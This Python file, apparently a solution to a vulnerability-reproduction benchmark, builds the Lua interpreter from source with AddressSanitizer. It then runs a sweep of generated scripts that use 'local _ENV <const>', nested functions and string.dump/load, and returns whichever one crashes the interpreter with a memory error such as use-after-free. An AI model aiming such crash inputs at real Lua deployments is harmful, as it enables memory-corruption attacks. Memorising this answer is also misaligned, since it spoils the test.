import os
import re
import tarfile
import tempfile
import subprocess
import shutil
import time
from typing import List, Optional


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tar:
        for member in tar.getmembers():
            name = member.name
            if not name or name.startswith("/") or ".." in name.split("/"):
                continue
            tar.extract(member, dst_dir)


def _find_lua_src_dir(root: str) -> Optional[str]:
    # Prefer typical layout: root/src/lua.c
    cand = os.path.join(root, "src")
    if os.path.isfile(os.path.join(cand, "lua.c")) and os.path.isfile(os.path.join(cand, "lparser.c")):
        return cand

    # Otherwise, scan a few levels
    for dirpath, dirnames, filenames in os.walk(root):
        if "lua.c" in filenames and "lparser.c" in filenames:
            return dirpath
        # prune deep search
        rel = os.path.relpath(dirpath, root)
        if rel != "." and rel.count(os.sep) >= 5:
            dirnames[:] = []
    return None


def _compile_lua(src_dir: str, out_dir: str, time_limit_s: float = 30.0) -> Optional[str]:
    cc = shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
    if not cc:
        return None

    c_files = []
    for fn in os.listdir(src_dir):
        if not fn.endswith(".c"):
            continue
        if fn in ("luac.c", "ltests.c", "ltest.c"):
            continue
        c_files.append(os.path.join(src_dir, fn))

    if not c_files or not os.path.isfile(os.path.join(src_dir, "lua.c")):
        return None

    lua_exe = os.path.join(out_dir, "lua_asan")
    common_flags = [
        "-std=c99",
        "-O1",
        "-g",
        "-fno-omit-frame-pointer",
        "-I", src_dir,
        "-DLUA_USE_LINUX",
        "-DLUA_COMPAT_5_3",
    ]

    link_flags = ["-lm"]
    # Some builds require -ldl on Linux
    if os.path.exists("/lib/x86_64-linux-gnu/libdl.so.2") or os.path.exists("/usr/lib/x86_64-linux-gnu/libdl.so"):
        link_flags.append("-ldl")

    sanitize_sets = [
        ["-fsanitize=address,undefined", "-fno-sanitize-recover=all"],
        ["-fsanitize=address", "-fno-sanitize-recover=all"],
        [],
    ]

    start = time.monotonic()
    for san in sanitize_sets:
        if time.monotonic() - start > time_limit_s:
            break
        cmd = [cc, *common_flags, *san, "-o", lua_exe, *c_files, *link_flags]
        try:
            r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=max(5.0, time_limit_s - (time.monotonic() - start)))
        except Exception:
            continue
        if r.returncode == 0 and os.path.isfile(lua_exe):
            return lua_exe

    return None


def _run_lua(lua_exe: str, code: bytes, timeout_s: float = 1.0) -> subprocess.CompletedProcess:
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
    opts = []
    if env["ASAN_OPTIONS"]:
        opts.append(env["ASAN_OPTIONS"])
    opts.append("detect_leaks=0")
    opts.append("abort_on_error=1")
    opts.append("halt_on_error=1")
    opts.append("allocator_may_return_null=1")
    opts.append("symbolize=0")
    env["ASAN_OPTIONS"] = ":".join([o for o in opts if o])

    return subprocess.run(
        [lua_exe, "-"],
        input=code,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        timeout=timeout_s,
    )


def _is_sanitizer_crash(proc: subprocess.CompletedProcess) -> bool:
    if proc.returncode == 0:
        return False
    if proc.returncode < 0:
        return True
    err = proc.stderr or b""
    pats = [
        b"AddressSanitizer",
        b"ERROR: AddressSanitizer",
        b"UndefinedBehaviorSanitizer",
        b"heap-use-after-free",
        b"use-after-free",
        b"SEGV",
        b"stack-use-after-scope",
        b"runtime error:",
    ]
    return any(p in err for p in pats)


def _varnames(n: int) -> List[str]:
    return [f"a{i}" for i in range(n)]


def _gen_script(n: int, *, wrap_do: bool, env_init: str, global_def: bool, inner_env_decl: bool, use_dump_load: bool) -> bytes:
    v = _varnames(n)
    vlist = ",".join(v)
    # Return list: also include some globals to force _ENV usage inside nested functions
    retlist = vlist
    if retlist:
        retlist += ","
    retlist += "math,string,tonumber,tostring,collectgarbage"

    lines = []
    if wrap_do:
        lines.append("do")
    lines.append(f"local _ENV <const> = {env_init}")
    if n > 0:
        lines.append(f"local {vlist} = 0")

    if global_def:
        lines.append("function maker()")
    else:
        lines.append("local function maker()")
    if inner_env_decl:
        lines.append("  local _ENV <const> = _ENV")
    lines.append("  local function inner()")
    lines.append(f"    return {retlist}")
    lines.append("  end")
    lines.append("  return inner")
    lines.append("end")

    lines.append("local f = maker()")
    lines.append("local t1 = {f()}")

    if use_dump_load:
        lines.append("local s = string.dump(f)")
        lines.append("f = nil")
        lines.append("collectgarbage('collect')")
        lines.append("local g = assert(load(s))")
        lines.append("local t2 = {g()}")
        lines.append("return #t1 + #t2")
    else:
        lines.append("collectgarbage('collect')")
        lines.append("return #t1")

    if wrap_do:
        lines.append("end")

    src = "\n".join(lines) + "\n"
    return src.encode("utf-8")


def _best_guess_script() -> bytes:
    return _gen_script(
        200,
        wrap_do=True,
        env_init="_ENV",
        global_def=True,
        inner_env_decl=True,
        use_dump_load=True,
    )


class Solution:
    def solve(self, src_path: str) -> bytes:
        deadline = time.monotonic() + 70.0

        with tempfile.TemporaryDirectory() as tmp:
            root = None
            if os.path.isdir(src_path):
                root = src_path
            else:
                try:
                    _safe_extract_tar(src_path, tmp)
                    # choose a likely root
                    entries = [os.path.join(tmp, x) for x in os.listdir(tmp)]
                    dirs = [d for d in entries if os.path.isdir(d)]
                    root = dirs[0] if len(dirs) == 1 else tmp
                except Exception:
                    root = tmp

            src_dir = _find_lua_src_dir(root) if root else None
            if not src_dir:
                return _best_guess_script()

            lua_exe = None
            try:
                lua_exe = _compile_lua(src_dir, tmp, time_limit_s=max(5.0, min(30.0, deadline - time.monotonic())))
            except Exception:
                lua_exe = None

            if not lua_exe:
                return _best_guess_script()

            candidates = []

            # Small targeted candidates
            candidates.append(b"local _ENV <const> = _ENV\nfunction f() return 1 end\nreturn f()\n")
            candidates.append(b"do\nlocal _ENV <const> = _ENV\nfunction f() return math end\nreturn f()\nend\n")
            candidates.append(b"local _ENV <const> = _ENV\nfunction maker() local function inner() return math.sin(0) end return inner end\nlocal g=maker()\nreturn g()\n")
            candidates.append(b"do\nlocal _ENV <const> = _ENV\nfunction maker() local _ENV <const> = _ENV; local function inner() return tostring(1), math end; return inner end\nlocal g=maker()\nlocal s=string.dump(g)\nlocal h=assert(load(s))\nreturn h()\nend\n")

            # Structured parameter sweep
            n_list = [0, 1, 5, 10, 30, 50, 80, 100, 130, 150, 170, 180, 190, 200, 210, 220, 230, 240]
            env_inits = ["_ENV", "_G", "(_ENV)"]
            for n in n_list:
                for env_init in env_inits:
                    for wrap_do in (False, True):
                        for global_def in (True, False):
                            for inner_env in (True, False):
                                for use_dump in (False, True):
                                    candidates.append(
                                        _gen_script(
                                            n,
                                            wrap_do=wrap_do,
                                            env_init=env_init,
                                            global_def=global_def,
                                            inner_env_decl=inner_env,
                                            use_dump_load=use_dump,
                                        )
                                    )
                                    if time.monotonic() > deadline:
                                        break
                                if time.monotonic() > deadline:
                                    break
                            if time.monotonic() > deadline:
                                break
                        if time.monotonic() > deadline:
                            break
                    if time.monotonic() > deadline:
                        break
                if time.monotonic() > deadline:
                    break

            tried = 0
            for code in candidates:
                if time.monotonic() > deadline:
                    break
                tried += 1
                try:
                    proc = _run_lua(lua_exe, code, timeout_s=1.2)
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
                if _is_sanitizer_crash(proc):
                    # Normalize line endings and strip trailing spaces
                    txt = code.decode("utf-8", "ignore")
                    txt = "\n".join([ln.rstrip() for ln in txt.splitlines()]) + "\n"
                    out = txt.encode("utf-8", "ignore")
                    return out

            return _best_guess_script()